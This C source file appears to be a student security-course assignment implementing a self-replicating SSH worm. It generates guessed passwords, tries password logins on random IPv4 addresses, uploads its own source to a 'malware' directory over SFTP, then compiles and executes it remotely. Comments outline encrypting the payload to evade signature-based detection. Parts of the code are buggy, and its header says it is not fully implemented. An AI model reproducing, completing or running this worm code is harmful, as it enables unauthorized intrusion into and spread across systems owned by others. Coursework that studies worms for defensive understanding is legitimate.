// Name : Chandrawanshi Mangesh Shivaji 
// Roll No. : 1801CS16
// CS547 MIDSEM ASSIGNMENT 2022
// 24/02/2022 

// Note : Not actually implemented just wrote the comments where the changes would be made

#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <sys/stat.h>
#include <fcntl.h>

#define N 21 // Number of Usernames and Passwords (16 + 5)

int vis[7][25][20];

char alphabet[26] = {
    'a','b','c','d','e','f','g','h','i',
    'j','k','l','m','n','o','p','q', 'r',
    's','t','u','v','w','x','y','z'
};

char digit[10] = {
    '0','1','2','3','4','5','6','7','8','9'
};

char NamePrefix[][5] = {
    "you","xani","bell","nato","eva","man","sam"
};

char NameSuffix[][5] = {
    "","us","ix","ox","ith","ath","y","123",
    "axia","imus","ais","itur","orex","o",
    "456","789","007","um","ator","or"
};

const char NameStems[][10] = {
    "adur","aes","anim","apoll","imac",
 	"educ","equis","extr","guius","hann",
    "equi","amora","hum","iace","ille",
    "inept","iuv","obe","ocul","orbis",
    "_","-","1234","5678","1007"
};

// Function to generate username
void NameGen(char * UserName, int pf, int stm, int sf) {
    UserName[0] = 0;
    strcat(UserName, NamePrefix[pf]);
    strcat(UserName, NameStems[stm]);
    strcat(UserName, NameSuffix[sf]);
    return;
}

// Function to generate password, format : a chars, b digits, c charss
void PassGen(char * password, int a, int b, int c) {
    int i = 0;

    while (a--) {
        password[i++] = alphabet[rand() % 26];
    }
    while (b--) {
        password[i++] = digit[rand() % 10];
    }
    while (c--) {
        password[i++] = alphabet[rand() % 26];
    }

    password[i] = '\0';
    if (rand() % 2 && password[0] >= 'a' && password[0] <= 'z')
        password[0] = toupper(password[0]);

    return;
}

// Write/Transfer a file at a remote server location/directory
int sftp_send_file(ssh_session session, sftp_session sftp){
    
    int access_type = O_WRONLY | O_CREAT | O_TRUNC;

    sftp_file file;
    file = sftp_open(sftp, "/malware/1801CS16_MSE_WORM.c", access_type, 1);
    
    if (file == NULL){
        fprintf(stderr, "Can't open file for writing: %s\n", ssh_get_error(session));
        return SSH_ERROR;
    }

    FILE *ptr;
    ptr = fopen("1801CS16_MSE_WORM.c", "r");
    if (ptr == NULL){
        printf("1801CS16_MSE_WORM.c can't be opened \n");
        return -1;
    }

    char buffer[1024];
    int nwritten = 0;
    while (fgets(buffer, 1024, ptr) != NULL){
        nwritten += sftp_write(file, buffer, 1024);
    }

    fclose(ptr);
    
    int length = strlen(buffer);
    int rc;

    // Before Writing encrypt the worm content and add the decryption key along with it.
    // Also write a decrypt method to actually decrypt the code to original/useful(or we can say harmful) state.
    // This will also evade detection from signature based schemes which lookout for specific keywords in files/worm code0 
 
    nwritten = sftp_write(file, buffer, length);
    
    if(nwritten != length){
        fprintf(stderr, "Can't write data to file: %s\n",ssh_get_error(session));
        sftp_close(file);
        return SSH_ERROR;
    }

    rc = sftp_close(file);
    if (rc != SSH_OK){
        fprintf(stderr, "Can't close the written file: %s\n",ssh_get_error(session));
        return rc;
    }

    return SSH_OK;
}


// Run the worm in remote server to make it self-contained
int run_remote_processes(ssh_session session)
{
    ssh_channel channel;
    int rc;

    channel = ssh_channel_new(session);    
    if (channel == NULL)
        return SSH_ERROR;

    rc = ssh_channel_open_session(channel);
    if (rc != SSH_OK)
    {
        ssh_channel_free(channel);
        return rc;
    }

    rc = ssh_channel_request_exec(channel, "cd /malware/; chmod 777 1801CS16_MSE_WORM.c; gcc -Wall 1801CS16_MSE_WORM.c -o 1801CS16_MSE_WORM -lssh -DLIBSSH_STATIC; ./1801CS16_MSE_WORM");
    if (rc != SSH_OK)                     
    {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return rc;
    }

   
    ssh_channel_close(channel);
    ssh_channel_free(channel);

    return SSH_OK;
}

int main()
{

	memset(vis, 0, sizeof(vis));
    int idx = 0;
    srand((long) time(NULL)); //Seed the random number generator...	

    int pf = 0, stm = 0, sf = 0;
    // Range for pf 0-6, stm 0-24, sf 0-19

    int a = 0, b = 0, c = 0;

    char usernames[N][21];
    char passwords[N][15];

    while(idx < N){

    	// Username
        do {
            pf = rand() % 7;
            stm = rand() % 25;
            sf = rand() % 20;
        } while (vis[pf][stm][sf] != 0);

        char UserName[21];
        NameGen(UserName, pf, stm, sf);
        vis[pf][stm][sf] = 1;
        //printf("%s - ", UserName);

        // Password
        int passwordLength = 8 + (rand() % 5);
        char password[15];

        do {
            a = rand() % passwordLength;
            b = rand() % passwordLength;
            c = rand() % passwordLength;
        } while (a + b + c != passwordLength);
        PassGen(password, a, b, c);
        //printf("%s - ", password);

        for(int i=0;i<21;i++){
        	usernames[idx][i] = UserName[i];
    	}
    	for(int i=0;i<15;i++){
        	passwords[idx][i] = password[i];
        }

        idx++;
    }

    /*
    for(int i=0;i<21;i++){
    	printf("%s -> %s\n", usernames[i], passwords[i]);
    }*/

    int iterations = 10;

    while(iterations--){

    	idx = rand() % N;

    	printf("\nTry breaking into random hosts ...");

    	char HostIPAddress[15];

    	for(int i=0;i<4;i++){
    		int num = rand() % 256;
    		HostIPAddress[i*4] = (num/100 + '0');
    		HostIPAddress[i*4 + 1] = ( ((num/10)%10) + '0');
    		HostIPAddress[i*4 + 2] = (num%10 + '0'); 

    		if(i != 3)
    			HostIPAddress[i*4 + 3] = '.';
    	}
    	printf("\nHost IP Address : %s\n", HostIPAddress);
    	printf("username : %s\n", usernames[idx]);
    	printf("password : %s\n", passwords[idx]);


        //Create session
        ssh_session my_ssh_session = ssh_new();
        if(my_ssh_session == NULL)
        {
            printf("Unable to start the session.....\n");
            continue;
        }

        //Settings
        int verbosity = SSH_LOG_PROTOCOL;
        int port = 22;
        ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, HostIPAddress);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
        
        //Connect to server
        int rc;
        rc = ssh_connect(my_ssh_session);
        if(rc != SSH_OK)
        {
            fprintf(stderr, "Error connecting to localhost: %s\n",ssh_get_error(my_ssh_session));
            ssh_free(my_ssh_session);
            continue;
        }

        //Authenticate User
        rc = ssh_userauth_password(my_ssh_session, NULL, passwords[idx]);
        if(rc != SSH_AUTH_SUCCESS){
            fprintf(stderr, "Error authenticating with password: %s\n",ssh_get_error(my_ssh_session));
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            continue;   
        }

        //In case of succesful auth, send worm code to remote server using sftp

        //Create sftp session
        sftp_session sftp;

        sftp = sftp_new(my_ssh_session);
        if (sftp == NULL){
            fprintf(stderr, "Error allocating SFTP session: %s\n",ssh_get_error(my_ssh_session));
            sftp_free(sftp);
            ssh_free(my_ssh_session);
            continue;
        }

        rc = sftp_init(sftp);
        if (rc != SSH_OK){
            fprintf(stderr, "Error initializing SFTP session: code %d.\n",
            sftp_get_error(sftp));
            ssh_free(my_ssh_session);
            continue;
        }

        //Create a directory(malware) in remote server
        rc = sftp_mkdir(sftp, "malware", S_IRWXU);
        if(rc != SSH_OK){
            if (sftp_get_error(sftp) != SSH_FX_FILE_ALREADY_EXISTS){
                fprintf(stderr, "Can't create directory: %s\n",ssh_get_error(my_ssh_session));
                ssh_free(my_ssh_session);
                continue;
            }
        }

        //Transfer worm code    
        rc = sftp_send_file(my_ssh_session,sftp);
        if (rc != SSH_OK)
        {
            printf("Not able to transfer 1801CS16_MSE_WORM.c in remote server \n");
            fprintf(stderr, "Error: %s\n", ssh_get_error(my_ssh_session)); 
            ssh_free(my_ssh_session);
            continue;
        }

        //Execute worm on remote server
        rc=run_remote_processes(my_ssh_session);
        if (rc != SSH_OK)
        {
            printf("Not able to run 1801CS16_MSE_WORM.c in remote server \n");
            fprintf(stderr, "Error: %s\n", ssh_get_error(my_ssh_session)); 
            ssh_free(my_ssh_session);
            continue;
        }

        sftp_free(sftp);
        ssh_free(my_ssh_session);

    	printf("\n\n");
    }
	
	return 0;
}